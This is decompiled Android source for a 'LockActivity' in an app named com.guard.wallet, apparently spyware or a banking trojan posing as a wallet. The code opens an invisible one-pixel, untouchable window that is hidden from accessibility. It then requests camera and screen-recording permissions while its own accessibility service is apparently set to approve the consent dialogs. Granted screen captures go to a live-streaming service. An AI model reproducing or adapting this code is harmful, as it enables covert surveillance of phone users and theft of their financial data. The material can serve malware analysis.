package com.guard.wallet;

import a1.AbstractC0026q;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Rect;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.view.PointerIconCompat;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowMetrics;
import com.guard.wallet.service.MediaLiveService;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.Objects;
import p010m.C0396c;
import p010m.C0397d;
import p012o.C0423l;
import p012o.C0426o;
import p020x.C0967a;

/* loaded from: classes.dex */
public class LockActivity extends Activity {

    /* renamed from: a */
    public static volatile LockActivity f180a;

    /* renamed from: a */
    public static void m330a() {
        if (f180a != null) {
            synchronized (LockActivity.class) {
                if (f180a != null) {
                    f180a.finish();
                }
            }
        }
    }

    /* renamed from: b */
    public static LockActivity m331b() {
        LockActivity lockActivity;
        synchronized (LockActivity.class) {
            lockActivity = f180a;
        }
        return lockActivity;
    }

    /* renamed from: c */
    public final void m332c() {
        if (Objects.equals(0, Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CAMERA"))) || MyAccessibilityService.m554P() == null) {
            return;
        }
        MyAccessibilityService m554P = MyAccessibilityService.m554P();
        m554P.getClass();
        try {
            if (m554P.m528i()) {
                m554P.m542w();
            }
            m554P.f303a.add(new C0423l());
            m554P.m539t(C0423l.class.getName(), C0423l.m1132J());
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
        AbstractC0251g.T0(5);
        ActivityCompat.requestPermissions(this, new String[]{"android.permission.CAMERA"}, PointerIconCompat.TYPE_WAIT);
    }

    /* renamed from: d */
    public final void m333d() {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService("media_projection");
        if (mediaProjectionManager == null || MyAccessibilityService.m554P() == null) {
            return;
        }
        MyAccessibilityService m554P = MyAccessibilityService.m554P();
        m554P.getClass();
        try {
            if (m554P.m532m()) {
                m554P.m544y();
            }
            m554P.f303a.add(new C0426o());
            m554P.m539t(C0426o.class.getName(), Collections.singletonList(C0426o.m1133H()));
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
        }
        AbstractC0251g.T0(5);
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), PointerIconCompat.TYPE_HELP);
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i2, int i3, Intent intent) {
        if (i2 != 1003) {
            super.onActivityResult(i2, i3, intent);
            return;
        }
        C0967a m1462b = C0967a.m1462b();
        m1462b.getClass();
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService.m554P().m544y();
        }
        m1462b.f2301f.set(false);
        if (i3 == -1) {
            Log.d("LockActivity", "录屏权限申请成功");
            if (Build.VERSION.SDK_INT >= 29) {
                Intent intent2 = new Intent(this, (Class<?>) MediaLiveService.class);
                intent2.putExtra("code", i3);
                intent2.putExtra("data", intent);
                startForegroundService(intent2);
            } else {
                C0967a.m1462b().m1467g(intent);
            }
        } else {
            Log.e("LockActivity", "录屏权限申请失败");
        }
        finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        WindowMetrics currentWindowMetrics;
        Rect bounds;
        super.onCreate(bundle);
        View view = new View(this);
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 30) {
            currentWindowMetrics = getWindow().getWindowManager().getCurrentWindowMetrics();
            bounds = currentWindowMetrics.getBounds();
            view.layout(bounds.left, bounds.top, bounds.right, bounds.bottom);
        }
        view.setImportantForAccessibility(2);
        if (i2 >= 30) {
            view.setImportantForContentCapture(2);
        }
        setContentView(view);
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.dimAmount = 0.0f;
        attributes.x = 0;
        attributes.y = 0;
        attributes.width = 1;
        attributes.height = 1;
        attributes.gravity = 8388661;
        getWindow().setAttributes(attributes);
        getWindow().getDecorView().setBackgroundColor(0);
        getWindow().setFlags(1024, 1024);
        getWindow().addFlags(32);
        getWindow().addFlags(16);
        getWindow().addFlags(8);
        AbstractC0252h.m688I();
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        Log.d("LockActivity", "LockActivity onDestroy:" + Thread.currentThread().getId());
        super.onDestroy();
        if (f180a != null) {
            synchronized (LockActivity.class) {
                f180a = null;
            }
        }
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i2, String[] strArr, int[] iArr) {
        C0396c c0396c;
        int i3;
        if (i2 != 1004) {
            super.onRequestPermissionsResult(i2, strArr, iArr);
            return;
        }
        C0397d m963c = C0397d.m963c();
        m963c.getClass();
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService.m554P().m542w();
        }
        if (AbstractC0251g.m664k() && (c0396c = m963c.f801e) != null && (i3 = c0396c.f793b) >= 0) {
            m963c.m964a(i3);
        }
        m963c.f797a.set(false);
        if (iArr.length <= 0 || iArr[0] != 0) {
            Log.e("LockActivity", "摄像头权限申请失败");
        } else {
            Log.d("LockActivity", "摄像头权限申请成功");
        }
        finish();
    }

    @Override // android.app.Activity
    public final void onRestoreInstanceState(Bundle bundle) {
        super.onRestoreInstanceState(bundle);
        Log.d("LockActivity", "LockActivity onRestoreInstanceState:" + Thread.currentThread().getId());
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        Log.d("LockActivity", "LockActivity onResume:" + Thread.currentThread().getId());
    }

    @Override // android.app.Activity
    public final void onStart() {
        super.onStart();
        Log.d("LockActivity", "LockActivity onStart:" + Thread.currentThread().getId());
        if (f180a == null) {
            synchronized (LockActivity.class) {
                if (f180a == null) {
                    f180a = this;
                }
            }
            if (C0967a.m1462b().f2301f.get()) {
                m333d();
            }
            if (C0397d.m963c().f797a.get()) {
                m332c();
            }
        }
    }

    @Override // android.app.Activity
    public final void onStop() {
        Log.d("LockActivity", "LockActivity onStop:" + Thread.currentThread().getId());
        super.onStop();
    }
}
